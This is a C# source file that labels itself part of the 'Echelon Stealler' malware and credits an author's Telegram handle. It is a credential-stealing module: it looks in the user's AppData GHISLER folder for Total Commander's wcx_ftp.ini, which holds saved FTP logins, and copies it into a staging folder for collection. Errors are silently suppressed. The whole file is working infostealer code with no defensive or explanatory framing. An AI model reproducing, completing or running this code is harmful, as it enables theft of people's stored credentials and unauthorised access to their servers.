///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System.IO;

namespace Echelon
{
	class TotalCommander
    {
        
        public static int count = 0;
        public static void Start(string Echelon_Dir)
        {
			try
			{
				string text2 = Help.AppDate + "\\GHISLER\\";
				if (Directory.Exists(text2))
				{
                    Directory.CreateDirectory(Echelon_Dir + "\\FTP\\Total Commander");
                }
				FileInfo[] files = new DirectoryInfo(text2).GetFiles();
				for (int i = 0; i < files.Length; i++)
				{
					if (files[i].Name.Contains("wcx_ftp.ini"))
					{
                       
                        File.Copy(text2 + "wcx_ftp.ini", Echelon_Dir + "\\FTP\\Total Commander\\wcx_ftp.ini");
                        count++;
                    }
				}
			}
			catch {}
		}
    }
}


